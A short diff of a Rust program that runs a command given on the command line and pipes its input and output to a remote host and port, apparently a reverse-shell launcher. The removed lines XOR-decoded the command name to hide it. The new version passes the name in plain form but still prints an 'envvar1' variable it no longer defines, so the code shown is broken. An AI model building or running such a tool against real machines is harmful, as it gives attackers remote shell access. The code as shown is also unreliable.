@@ -16,11 +16,12 @@ fn main() {
     let port = &args[2];
     let envvar = &args[3];
     let arguments = &args[4];
-    let xorkey: u8 = args[5].parse().expect("Invalid XOR key");
-
-    let envvar1: String = envvar.chars()
+    /*let xorkey: u8 = args[5].parse().expect("Invalid XOR key");
+	let envvar1: String = envvar.chars()
         .map(|c| (c as u8 ^ xorkey) as char)
-        .collect();
+        .collect();*/
+
+    //let envvar1: String = envvar.chars();
 
     println!("Executing {} {} and redirecting stdout / stderr to {}:{}", envvar1, arguments, host, port);
 
@@ -34,8 +35,8 @@ fn main() {
 
     let (tx, rx) = mpsc::channel();
     let tx2 = tx.clone();
-
-    let mut child = Command::new(&envvar1)
+	
+    let mut child = Command::new(envvar)
         .args(arguments.split_whitespace())
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
